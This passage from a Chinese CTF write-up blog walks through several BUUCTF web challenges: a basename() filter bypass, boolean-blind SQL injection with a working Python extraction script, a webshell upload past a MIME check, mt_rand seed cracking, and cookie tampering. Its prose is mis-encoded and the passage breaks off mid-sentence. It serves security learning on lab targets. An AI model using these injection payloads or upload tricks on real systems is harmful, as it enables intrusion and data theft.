:)&quot;</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><code>/config.php/*$/i</code>è¿™éƒ¨åˆ†çš„æ„æ€å°±æ˜¯ä¸åŒºåˆ†å¤§å°å†™åŒ¹é…<code>config.php/</code>ç»“å°¾çš„å­—ç¬¦ä¸²<code>(å…¶ä¸­/åŒ¹é…é›¶æ¬¡æˆ–å¤šæ¬¡)</code></p><p>ã€‚è¿™æ ·ä»¥æ¥å°±é™åˆ¶äº†æˆ‘ä»¬åˆ©ç”¨<code>highlight_file</code>å‡½æ•°å»æ‹¿flagã€‚ä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æŸäº›å­—ç¬¦ä¸²ç»•è¿‡æ­£åˆ™ï¼š<strong>basename()ä¼šå»æ‰ä¸å¯è§å­—ç¬¦</strong>ï¼Œ<code>Fuzz</code>ä¸€ä¸‹ä¸å¯è§å­—ç¬¦ï¼Œç„¶åéšä¾¿å–ä¸€ä¸ªå°±è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) === <span class="hljs-string">&#x27;config.php&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//æ³¨æ„è¿™ä¸ª%2Få…¶å®æ˜¯/ï¼Œä¸èƒ½ç”¨ï¼</span><br></code></pre></td></tr></table></figure><p><img src="/img/canuguess1.png" alt="canuguess1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php/config.php/%ff?source=1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;flag&#123;2c11cab3-0cfc-4f3d-ac4e-87969e74320e&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>index.php/config.php/%ff?source=1</code>ç»è¿‡<code>$_SERVER[&#39;PHP_SELF&#39;]</code>å˜æˆ<code>index.php/config.php/%ff</code>()è¿™é‡Œä¸ä¼šè§¦å‘æ­£åˆ™)ï¼Œç„¶å<code>basename</code>å»æ‰ä¸å¯è§å­—ç¬¦å¾—åˆ°<code>config.php</code></p><h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>éšä¾¿è¾“ä¸ª<code>student number</code>ï¼Œæ³¨æ„<code>URL</code>:</p><p><img src="/img/yanzhi1.png" alt="yanzhi1"></p><p>åˆæ­¥åˆ¤æ–­<code>SQL</code>æ³¨å…¥ï¼Œé€šè¿‡<code>1&#39;--+/1&#39;%23/1 --+ /1%23</code>åˆ¤æ–­æ˜¯æ•°å­—å‹æ³¨å…¥</p><p><code>?stunum=1 and 1--+</code></p><p><img src="/img/yanzhi5.png" alt="yanzhi5"></p><p><code>?stunum=1/**/and/**/0 --+</code>:(è¿‡æ»¤ç©ºæ ¼ï¼Œ0æ¢æˆ1æœ‰å›æ˜¾)</p><p><img src="/img/yanzhi4.png" alt="yanzhi4"></p><p>å°è¯•äº†å †å æ³¨å…¥æ²¡ç»“æœã€‚ã€‚è¯•äº†è¯•<code>if(length(database())&gt;1,1,0)</code></p><p><img src="/img/yanzhi2.png" alt="yanzhi2"></p><p><code>?stunum=if(length(database())&gt;99,1,0)</code></p><p><img src="/img/yanzhi3.png" alt="yanzhi3"></p><p>å¸ƒå°”ç›²æ³¨ï¼Œå¯ä»¥é€šè¿‡é¡µé¢å›æ˜¾åˆ¤æ–­<code>if</code>è¯­å¥æ­£ç¡®ä¸å¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://622046c8-08bf-4bd2-8873-9d43830c90c6.node4.buuoj.cn:81/&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br>        paylaod = &#123;<span class="hljs-string">&quot;stunum&quot;</span>:<span class="hljs-string">&quot;if(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)&#125;<br>        <span class="hljs-comment">#çˆ†åº“ï¼šif(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#çˆ†è¡¨ï¼šif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#çˆ†å­—æ®µï¼šif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#çˆ†æ•°æ®ï¼šif(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        r = requests.get(url=url,params=paylaod)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.3</span>)<br><br></code></pre></td></tr></table></figure><p>ç®€å•è¯´ä¸€ä¸‹äºŒåˆ†æ³•åŸç†ï¼Œé¦–å…ˆæ˜¯è®¾ç½®<code>low=31</code>å’Œ<code>high=127</code>:<code>ASCII</code>ç ä¸­å¯è§å­—ç¬¦çš„èŒƒå›´æ˜¯<code>32-126</code>ã€‚</p><p>è‡ªå·±å†™ä¸ªå­—å…¸æ”¾è¿›å»éå†ä¹Ÿè¡Œã€‚</p><p> <code>min = mid +1</code> å’Œ <code>max = mid</code>:</p><p>å½“åˆ¤æ–­ <code>mid </code>å¤§äºæŸä¸ªå€¼çš„ç»“æœä¸º<code> true</code> æ—¶, è¿™ä¸ªæ‰€æ±‚å€¼è‚¯å®šæ˜¯æ¯”<code>mid</code>è¦å¤§çš„ (å¤§äº), æ‰€ä»¥æ˜¯ <code>mid + 1</code></p><p>å½“ç»“æœä¸º<code> false</code> æ—¶, æ‰€æ±‚å€¼åº”è¯¥æ˜¯ä¸è¶…è¿‡<code>mid </code>(å°äºç­‰äº), æ‰€ä»¥æ˜¯ <code>max = mid</code></p><p>ç»è¿‡å¤šæ¬¡å¾ªç¯åè®©<code>high</code>æ¯”<code>low</code>å°ï¼Œè¿™æ—¶çš„<code>high</code>å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„æ•°æ®ã€‚</p><p>å¯ä»¥è‡ªå·±åœ¨è‰ç¨¿çº¸ä¸Šè¿‡ä¸€ä¸‹è¿‡ç¨‹ã€‚</p><p>è¿™é¢˜æ‰‹æ³¨ä¹Ÿå¯ä»¥ï¼šå‚è€ƒ<code>https://blog.csdn.net/weixin_61355725/article/details/126518079</code></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p><img src="/img/cvmaker1.png" alt="cvmaker1"></p><p>å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç™»å½•ï¼š</p><p><img src="/img/cvmaker2.png" alt="cvmaker2"></p><p>å‘ç°æœ‰ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ï¼ŒçŒœæµ‹æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š</p><p><img src="/img/cvmaker3.png" alt="cvmaker3"></p><p>æˆ‘ç‚¹æ›´æ¢å¤´åƒç„¶åéšä¾¿ä¸Šä¼ äº†ä¸ªä¸€å¥è¯ã€‚ã€‚å¡ä½äº†åˆ·æ–°é¡µé¢å°±å‡ºäº†è¿™ä¹ˆä¸ªä¸œè¥¿</p><p>å¦ˆçš„è¿™é¢˜æˆ‘ç¯å¢ƒæœ‰é—®é¢˜ã€‚ã€‚æ˜æ˜ç™»å½•äº†ä»–ä¸€ç›´ç»™æˆ‘å¼¹<code>Please Login </code>å•¥çš„ã€‚ã€‚çƒ¦æ­»äº†ï¼Œè€Œä¸”æœ‰æ—¶ç‚¹æŒ‰é’®å•¥ååº”ä¸ç»™</p><p><code>exif_imagetype</code>è¿™ä¸œè¥¿å°±æ˜¯ä¸ª<code>MIME</code>è¿‡æ»¤ï¼Œä¸Šä¼ ä¸€å¥è¯åæŠ“åŒ…æ”¹ä¸€ä¸‹<code>content-type</code>å°±è¡Œ</p><p>ä¸Šä¼ åä¼šè¿”å›ä¸€ä¸ªè·¯å¾„ï¼Œè®¿é—®ç„¶åèšå‰‘è¿æ¥</p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p><img src="/img/chou1.png" alt="chou1"></p><p>å³é”®çœ‹æºç ä¹Ÿæ²¡å•¥æç¤ºï¼Œè¯•ç€è¾“å…¥ä¸€äº›å­—ç¬¦ä¸²ç„¶åæŠ“åŒ…ï¼š</p><p><img src="/img/chou2.png" alt="chou2"></p><p>æ˜æ–‡ä¼ è¾“ï¼Œä¸è¿‡å¯ä»¥çœ‹åˆ°å³è¾¹å¥½åƒè¿”å›äº†éƒ¨åˆ†<code>PHP</code>ä»£ç ï¼Ÿ</p><p>æˆ‘å›åˆ°åŸé¡µé¢å¹¶æ²¡æœ‰å•¥æ–°ä¸œè¥¿ï¼Œ<code>F12</code>æ‰“å¼€ç½‘ç»œï¼Œé‡æ–°å‘æ•°æ®åå‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/chou3.png" alt="chou3"></p><p>è®¿é—®<code>check.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">JXRHwWFvH5<br><br>æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<span class="hljs-comment">//ç§å­</span><br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<span class="hljs-comment">//åŸå§‹å­—ç¬¦ä¸²ï¼Œèµ·å§‹ä½ç½®å’Œé•¿åº¦ </span><br>&#125;<br><span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<span class="hljs-comment">//ç»™äº†å‰åä½</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>); <br></code></pre></td></tr></table></figure><p>å¼ºç­‰äºç»•è¿‡è‚¯å®šä¸è¦æƒ³äº†ï¼Œæœäº†ä¸€ä¸‹<code>mt_rand</code>ç»•è¿‡ï¼š<code>https://www.freebuf.com/vuls/192012.html</code></p><p>é‡ç‚¹å°±æ˜¯<code>mt_rand</code>è¿™ä¸œè¥¿ç”±å¯ç¡®å®šçš„å‡½æ•°ï¼Œé€šè¿‡ä¸€ä¸ªç§å­äº§ç”Ÿçš„ä¼ªéšæœºæ•°ã€‚è¿™æ„å‘³ç€ï¼šå¦‚æœçŸ¥é“äº†ç§å­ï¼Œæˆ–è€…å·²ç»äº§ç”Ÿçš„éšæœºæ•°ï¼Œéƒ½å¯èƒ½è·å¾—æ¥ä¸‹æ¥éšæœºæ•°åºåˆ—çš„ä¿¡æ¯ï¼ˆå¯é¢„æµ‹æ€§ï¼‰ã€‚</p><p>ç»™äº†åºåˆ—å’Œå‰åä½ï¼Œæˆ‘ä»¬å…ˆå°†å‰åä½è¿˜åŸæˆä¸ºç”Ÿæˆçš„éšæœºæ•°ï¼Œç„¶åæ‹¼æ¥å½¢æˆ<code>php_mt_seed</code>éœ€è¦çš„å‚æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$string</span>=<span class="hljs-string">&#x27;B8F2IQkNd6&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br><span class="hljs-variable">$pos</span>=<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str_long1</span>,<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]); <span class="hljs-comment">//strposä¼šè¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä»0å¼€å§‹</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; 0 61 &quot;</span> ;  <span class="hljs-comment">//é•¿åº¦62ï¼Œä»0åˆ°61</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//37 37 0 61 34 34 0 61 41 41 0 61 28 28 0 61 44 44 0 61 52 52 0 61 10 10 0 61 49 49 0 61 3 3 0 61 32 32 0 61 </span><br>    <br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">547943121</span>);    <span class="hljs-comment">//åœ¨è¿™é‡Œå¡«å…¥è·å¾—çš„ç§å­</span><br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$str</span>);<br><br><span class="hljs-comment">//B8F2IQkNd6gc0fOa7AvT</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/choujiang3.png" alt="choujiang3"></p><p>åˆ©ç”¨ç§å­ç”Ÿæˆéšæœºæ•°å†ç”Ÿæˆå¯†ç åæ³¨æ„å’Œå‰åä½å¯¹ä¸€ä¸‹(PHPç‰ˆæœ¬ä¸åŒç”Ÿæˆçš„ç»“æœä¸åŒ)</p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>å•†åº—ç±»å‹é¢˜ç›®ï¼š</p><p><img src="/img/cookiestore1.png" alt="cookiestore1"></p><p>æœ€å¼€å§‹æœ‰<code>50</code>ï¼Œè´­ä¹°<code>FLAG</code>éœ€è¦<code>100</code>ï¼Œè´­ä¹°æ—¶æŠ“åŒ…çœ‹ä¸‹è¿‡ç¨‹ï¼š</p><p><img src="/img/cookieeeestore2.png" alt="cookieeeestore2"></p><p>æ³¨æ„è¿™æ®µ<code>cookie</code>ï¼Œæ•°å­—å¤§å°å†™å­—æ¯æ··åˆç­‰å·ç»“å°¾ï¼Œçœ‹ç€åƒ<code>base64</code>ï¼Œè§£ç ï¼š</p><p><img src="/img/cookiestore3.png" alt="cookiestore3"></p><p>ä»¥<code>JSON</code>æ ¼å¼å­˜æœ‰é’±å’Œå†å²è´­ä¹°è®°å½•ï¼Œç›´æ¥ä¿®æ”¹<code>money</code>ä¸º<code>10000</code>:</p><p><img src="/img/cookiestore4.png" alt="cookiestore4"></p><p>è´­ä¹°<code>flag</code>ç„¶åæŠŠ<code>cookie</code>æ¢äº†å°±è¡Œï¼Œä¹°å®Œ<code>flag</code>æ˜¯å¤šå°‘ä¼šè‡ªå·±æ˜¾ç¤ºã€‚</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>é¢˜ç›®æç¤º<code>python,pickle</code>ï¼Œåº”è¯¥æ˜¯<code>pickle</code>çš„ååºåˆ—åŒ–æ¼æ´</p><p><img src="/img/kun1.png" alt="kun1"></p><p><img src="/img/kun2.png" alt="kun2"></p><p>ç›®æµ‹æ˜¯è¦é€šè¿‡æ•°æ®åŒ…ä¿®æ”¹ä¹°ä¸ª<code>lv6</code>çš„è´¦å·ï¼Œä¸è¿‡è¿™ä¸ªè´¦å·æœ‰å¾ˆå¤šé¡µè¦ä¸€é¡µä¸€é¡µç¿»(ä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬è¯•è¯•)ï¼Ÿå…ˆæ³¨å†Œçœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/kun3.png" alt="kun3"></p><p>å¯ä»¥çœ‹åˆ°åˆšè¿›å»æˆ‘ä»¬æ˜¯æœ‰<code>1000</code>çš„å¯åŠ¨èµ„é‡‘ï¼Œé¡µé¢<code>URL:http://7e29da18-470a-4d1c-99c1-70e88eff89f1.node4.buuoj.cn:81/shop?page=2</code> ï¼Œå†™ä¸ªè„šæœ¬æ‰¾<code>lv6</code>çš„ç•Œé¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">250</span>):<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    url = <span class="hljs-string">&#x27;http://ba07199e-5e59-4fe6-9118-5e18bdb18360.node4.buuoj.cn:81/shop?page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    res = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><p>æœ€å¼€å§‹è¿™ä¸ªè„šæœ¬è·‘çš„æ—¶å€™ç›´æ¥å›æ˜¾äº†<code>1</code>ï¼Œä½†ç¬¬ä¸€é¡µå¹¶æ²¡æœ‰<code>lv6</code>è¿™ä¸ªä¸œè¥¿ï¼Œæˆ‘åŠ äº†ä¸ª<code>print(r.text)</code>çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/kun5.png" alt="kun5"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„å­—ç¬¦å®åœ¨å¤ªå¤šï¼Œå¯èƒ½æœ‰å…¶å®ƒä¸œè¥¿è§¦å‘äº†<code>lv6</code>è¿™ä¸ªå…³é”®å­—ï¼Œçœ‹äº†æºç å‘ç°å®ƒçš„<code>lv</code>æ˜¯æœ‰ä¸€å®šæ ¼å¼çš„ï¼Œæ¯”å¦‚ï¼š</p><p><img src="/img/kun6.png" alt="kun6"></p><p>æ‰€ä»¥æŠŠ<code>lv6</code>æ”¹æˆ<code>lv6.png</code>å°±è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">250</span>):<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    url = <span class="hljs-string">&#x27;http://ba07199e-5e59-4fe6-9118-5e18bdb18360.node4.buuoj.cn:81/shop?page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    res = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment"># 181</span><br></code></pre></td></tr></table></figure><p>æœç„¶åœ¨<code>181</code>é¡µå‘ç°äº†æˆ‘ä»¬éœ€è¦çš„ï¼š</p><p><img src="/img/kun7.png" alt="kun7"></p><p><img src="/img/kun8.png" alt="kun8"></p><p>å¾ˆæ˜æ˜¾æˆ‘ä»¬é’±ä¸å¤Ÿï¼ŒæŠ“åŒ…çœ‹çœ‹èƒ½ä¸èƒ½ä¿®æ”¹å•¥çš„ï¼š</p><p><img src="/img/kun9.png" alt="kun9"></p><p>æ³¨æ„è¿™é‡Œçš„<code>price</code>å’Œ<code>discount</code>ï¼Œæˆ‘ä»¬åªæœ‰ä¸€åƒå—ï¼Œæˆ‘ä¸€å¼€å§‹æŠŠä»·æ 